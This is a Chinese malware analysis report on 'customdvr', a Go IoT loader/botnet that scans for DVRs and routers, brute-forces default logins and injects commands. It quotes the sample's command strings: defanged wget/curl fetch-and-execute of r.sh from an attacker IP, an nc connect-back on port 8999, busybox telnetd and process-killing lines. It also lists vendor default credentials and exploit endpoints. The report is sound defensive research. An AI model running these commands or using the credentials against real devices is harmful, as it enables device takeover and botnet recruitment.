---
title: "恶意样本分析：customdvr（ELF · elf · 5cfda71d）"
published: 2026-11-24
draft: false
description: "恶意（置信度中）：customdvr · loader/dropper/botnet · 难度 hard · 动态沙箱 + 静态反编译"
tags: ["customdvr", "loader", "dropper", "botnet", "ELF"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **customdvr**（存疑） · 置信度 **中**
> 
> 别名：Go 语言 IoT 投放器、Mirai 式 DVR/路由器装载器
> 
> 静态反编译与符号恢复显示完整攻击链：随机 IPv4 扫描、HTTP 指纹识别、内置厂商默认口令表、20 余类 DVR/路由器/摄像头漏洞利用、下载并执行 r.sh、以 nc/ busybox telnetd 开启反连会话，并把成功目标写入 report_bots/linux。相关能力均有函数、硬编码命令与字符串证据支撑，不是普通扫描工具。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **customdvr** · 别名 Go 语言 IoT 投放器、Mirai 式 DVR/路由器装载器 · _存疑_ |
| 置信度 | **中** |
| 行为类 | loader · dropper · botnet |
| 难度 | hard |
| 首次出现 | 2026-11-24 12:34:49 |
| 分析方法 | 动态沙箱分析（Linux 样本）+ 静态反编译 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/5cfda71da6af155bb0b3d88b8599453d25f6ecc4c0fff2a05f290e7d57d09ec5/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="34" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">启动加载投放目录</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1005</text>
<rect x="586" y="23" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="38" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
<circle cx="26" cy="84" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="84" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">输出投放统计</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<rect x="586" y="73" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="88" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">探测设备指纹</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1046</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">爆破默认口令</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1110.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">利用设备漏洞注入</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1190</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `5cfda71da6af155bb0b3d88b8599453d25f6ecc4c0fff2a05f290e7d57d09ec5` |
| MD5 | _未记录_ |
| 大小 | 6,029,496 字节（5.8 MB） |
| 类型 | ELF · `elf` |

## 行为分析

共 **11** 条行为，每条都挂了证据；其中 **9** 条静态可得、**2** 条经动态分析取得。

### 1. 启动加载投放目录

`T1005` · 置信度 **高** · 动态

启动时打开工作目录下的 dlrs/，按 arm5/arm6/arm7/mips/mpsl/nonempsl 等架构名取用待投放的 dropper 二进制；目录不存在时打印错误并立即退出。

> **证据**：main.telnetLoadDroppers(VA 0x263b64) 打开 dlrs/；动态系统调用跟踪 openat("dlrs", O_RDONLY|O_CLOEXEC) = -1 ENOENT，随后写 "Error: Failed to open dlrs/" 并退出
> 
> **来源**：`ref:dc00d2548c` · `ref:2520a77c98` · `ref:2177903e53`

### 2. 输出投放统计

`T1105` · 置信度 **高** · 动态

运行期维护并输出 Payload Sent / Telnet Opened / Shells / Go Routines 计数，用于跟踪对目标设备的投放与 shell 获取进度。

> **证据**：动态 write(1, "0's | Payload Sent: 0 | Telnet Opened: 0 | Shells: 0 | Go Routines: 2")；main.titleWriter(VA 0x286d10) 格式化该统计串
> 
> **来源**：`ref:dc00d2548c` · `ref:969bf53ee8`

### 3. 探测设备指纹

`T1046` · 置信度 **高** · 静态

对随机 IPv4 目标建立 TCP 连接并发送 GET / HTTP/1.1，依据 Server 头与页面标题指纹（Boa、GoAhead-Webs、uc-httpd、micro_httpd、JAWS、Avtech、httpd_four-faith 等）判断设备类型。

> **证据**：main.httpBannerCheck(VA 0x2866e0) 发送 "GET / HTTP/1.1\r\nHost: "；main.scannerInitExploits(VA 0x283798) 注册各设备指纹串
> 
> **来源**：`ref:e89a4b31ee` · `ref:969bf53ee8`

### 4. 爆破默认口令

`T1110.001` · 置信度 **高** · 静态

内置大量厂商默认/泄露账号口令（adminpldt、telecomadmin、stdONU101、CUadmin、root:hi3518 等），对 Telnet 23/2323 及各设备 HTTP 登录接口进行口令尝试。

> **证据**：.rodata 口令表；main.telnetLoader(VA 0x2653b0)、main.zteBrute(VA 0x274758)、main.wavlinkloginDevice(VA 0x2807b8)、main.gozyloginDevice(VA 0x2820cc) 等登录函数
> 
> **来源**：`ref:2177903e53` · `ref:e89a4b31ee`

### 5. 利用设备漏洞注入

`T1190` · 置信度 **高** · 静态

内置 20 余类 DVR/路由器/摄像头的命令注入与未授权接口利用链（TVT、DVRIP、Magic、GPON Fiber、Asus RT、AVTECH、Zyxel、Ruckus、Wavlink、GoAhead/goform、Brickcom 等），向设备下发 shell 命令。

> **证据**：main.scannerInitExploits 注册 infectFunction*；例如 main.infectFunctionDvrip(VA 0x267f94) 使用 /cgi-bin/webui/admin/tools/app_ping 注入，main.infectFunctionTvt(VA 0x2690a4) 使用 NVMS-9000 XML 请求
> 
> **来源**：`ref:e89a4b31ee` · `ref:2177903e53`

### 6. 下载并执行脚本

`T1105` · 置信度 **高** · 静态

令被入侵设备用 wget/curl 从 hxxp://45[.]198[.]224[.]75/run.sh（或 z.sh）取回 r.sh，chmod 755 后执行；或把本地 dropper 用 echo -ne 写入设备可写目录后运行。

> **证据**：main.telnetDropDropper(VA 0x254574) 中 "wget ... -O r.sh"、"chmod 755 r.sh && ./r.sh" 与 "hxxp://45.198.224[.]75/run.sh" 字面量
> 
> **来源**：`ref:2520a77c98` · `ref:2177903e53` · `ref:b491c4cb6f`

### 7. 开启反连会话

`T1059.004` · 置信度 **高** · 静态

通过注入命令在设备上执行 nc 45[.]198[.]224[.]75 8999 > cmd 建立反连，或以 /bin/busybox telnetd -p 打开 telnet 端口，供主控后续下发命令。

> **证据**：infectFunctionDvrip/goCloudSendPayload 中 "nc%2045.198.224.75%208999%20%3e%20cmd"；telnetLoader 中 "/bin/busybox telnetd -p"
> 
> **来源**：`ref:2177903e53` · `ref:e89a4b31ee`

### 8. 清理竞争进程

`T1489` · 置信度 **高** · 静态

在目标设备上执行 pkill -9 telnetd; killall telnetd; killall busybox，并反复拉起自己的 telnetd（.pi），以独占设备并排除其他僵尸网络。

> **证据**：telnetLoader/telnetWritableDir 字符串 "pkill -9 telnetd; killall telnetd; killall busybox"、"/bin/busybox chmod 777 .pi;./.pi"
> 
> **来源**：`ref:2177903e53`

### 9. 本地监听回连

`T1571` · 置信度 **高** · 静态

以 argv[1]=="listen" 分支在 0.0.0[.]0:19412 上监听，接受被感染设备反连的 shell 并进入命令交互循环。

> **证据**：main.main(VA 0x286efc) 调用 net.Listen(VA 0x132fe0)，地址串 "0.0.0[.]0:19412"，并把 os.Args[1] 与 "listen" 比较
> 
> **来源**：`ref:969bf53ee8` · `ref:2177903e53`

### 10. 规避蜜罐诱捕

`T1497` · 置信度 **中** · 静态

对探测响应做蜜罐特征判断，命中时打印 scanner:%s detected honeypot 并放弃该目标。

> **证据**：main.detectHoneypot(VA 0x2865c0) 与字符串 "scanner:%s detected honeypot"
> 
> **来源**：`ref:e89a4b31ee` · `ref:2177903e53`

### 11. 记录感染结果

`T1074` · 置信度 **中** · 静态

把成功登录/感染的设备地址写入 report_bots/linux 与 _infected.txt，便于后续统计与复用。

> **证据**：main.logDevice(VA 0x26320c) 引用 "report_bots/linux"、"_infected.txt"
> 
> **来源**：`ref:e89a4b31ee` · `ref:2177903e53`


## IOC（已去武器化）

### 网络

:::caution
**待动态验证**：上述地址为静态分析所得，分析环境网络隔离下未观察到成功的连接或会话，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://45[.]198[.]224[.]75/run.sh` | 80 | download | 静态 | ⏳ 未观测 |
| http | `hxxp://45[.]198[.]224[.]75/z.sh` | 80 | download | 静态 | ⏳ 未观测 |
| tcp | `45[.]198[.]224[.]75:8999` | 8999 | c2 | 静态 | ⏳ 未观测 |
| tcp | `0[.]0[.]0[.]0:19412（本地监听，接收设备反连 shell）` | 19412 | c2 | 静态 | ⏳ 未观测 |
| http | `multi[.]dm900 / multi[.]spain / multi[.]gponfiber / multi[.]usgflex[.]mips 等无 TLD 裸主机名（载荷分发）` | 80 | download | 静态 | ⏳ 未观测 |
| http | `hxxp://212[.]75[.]138[.]206:8080（Asus RT 防火墙参数 next_host）` | 8080 | c2 | 静态 | ⏳ 未观测 |

### 主机

**落地路径**

- `dlrs/`
- `.pi`
- `/tmp/vc`
- `/tmp/`
- `report_bots/linux`
- `_infected.txt`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `45.198.224[.]75` | 是 | 静态 |
| `payload_urls` | `/run.sh, /z.sh` | 是 | 静态 |
| `reverse_shell_port` | `8999` | 是 | 静态 |
| `listener_port` | `19412` | 是 | 静态 |
| `payload_staging_dir` | `dlrs/（按 arm5/arm6/arm7/mips/mpsl/nonempsl 架构取用）` | 是 | 动态 |
| `multi_hosts` | `multi.dm900, multi[.]spain, multi[.]zhone, multi[.]faith, multi[.]vigor, multi[.]tenda, multi[.]dlink, multi[.]gponfiber, multi[.]usgflex[.]mips, multi[.]libdvr, multi[.]dvrip, multi[.]hongdian, multi[.]baicells, multi[.]gargoyle, multi[.]tvt, multi[.]zte` | 否 | 静态 |
| `default_credentials` | `adminpldt:pldt1234, adminpldt:z6dUABtl270qRxt7a2uGTiw, telecomadmin:G3p0n#n3t, admin:stdONU101, CUadmin, root:hi3518, root:klv123, guest:guest, admin:mertx, admin:ZZprigorel123 等` | 是 | 静态 |
| `auth_scheme` | `HTTP Basic / Digest（含 digest-auth 客户端依赖）` | 否 | 静态 |
| `report_files` | `report_bots/linux, _infected.txt` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不得称其为勒索软件或窃密木马：未见文件加密、键盘记录或凭据回传逻辑，内置口令仅用于登录被攻击设备。
- 不得声称已观测到真实 C2 会话或成功外联：动态运行因 dlrs/ 载荷目录缺失在联网前退出，且动态环境网络隔离，所有 C2 均为静态提取并待验证。
- 不得把 212[.]75[.]138[.]206:8080 单独认定为独立 C2：它只出现在 Asus RT 防火墙改写请求的 next_host 参数中，实际用途未经动态证实。
- 不得把 multi[.]dm900 等裸主机名当作可直接访问的完整域名：样本中未见 TLD，实际解析/拼接方式未获证实。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 动态沙箱分析（Linux 样本）+ 静态反编译 |
| 脱壳 | 否 |

**局限与待验证**

1. 样本启动即因缺少同目录 dlrs/ 载荷目录而打印错误并退出，动态窗口内未产生任何 socket/connect 系统调用，C2 与外联行为无法动态确认。
2. 动态环境网络命名空间隔离，即使进入扫描阶段也无法建立真实外联；C2 的可用性、协议与回连角色只能来自静态代码与字符串。
3. 未取得多引擎扫描或 YARA 命中，family 以 Go 构建路径 customdvr 命名，未与公开家族形成确定映射，命名存在不确定性。
4. multi.* 类载荷主机名缺少 TLD，且未见协议前缀拼接代码被动态执行，实际下载 URL 形态未能证实。
5. 样本为 ARM32 架构、需指令翻译运行，部分内存/寄存器级动态细节（如监听端口是否成功 bind）未能观测。

## 证据索引

<details>
<summary>展开 8 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ev-000031` | 脚本化取证 | 解析 Go pclntab 与 .go.buildinfo：221 个 main.* 函数、模块 customdvr、Go 1.24.0/ARM/GOARM=6、digest-auth 依赖、Telnet 装载链与 20+ 设备利用函数清单 |
| `ev-000032` | 脚本化取证 | 提取 .rodata 投放/控制字符串：45.198.224[.]75/run.sh 与 z.sh、nc 8999、0.0.0[.]0:19412、multi.* 主机、dlrs/ 与架构名、report_bots/linux、_infected.txt、清理命令、默认口令、212.75.138[.]206:8080 |
| `ev-000007` | decompile.function | main.telnetLoadDroppers 伪代码：加载 dlrs/ 下按架构区分的 dropper，并构造写入/执行命令 |
| `ev-000008` | decompile.function | main.main 伪代码：依次调用 telnetLoadDroppers、scannerInitExploits，net.Listen 监听并比较 argv[1]=="listen" |
| `ev-000019` | dyn.trace.strace | 动态系统调用跟踪：openat("dlrs") = ENOENT 后输出统计与错误并退出，无 socket 调用 |
| `ev-000001` | 字符串提取 | 字符串扫描：14k+ ASCII 串与 flag 候选，含 payload/凭据/URL 上下文 |
| `ev-000009` | 密码学常量识别 | AES/MD5/SHA-1/SHA-256/CRC32/base64 常量，均为 Go 标准库密码学实现 |
| `ref:f0a4a19b00` | ELF 结构解析 | ELF32 little-endian ARM EXEC，静态链接、无 interp/DT_NEEDED，入口 VA 0x962F0 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
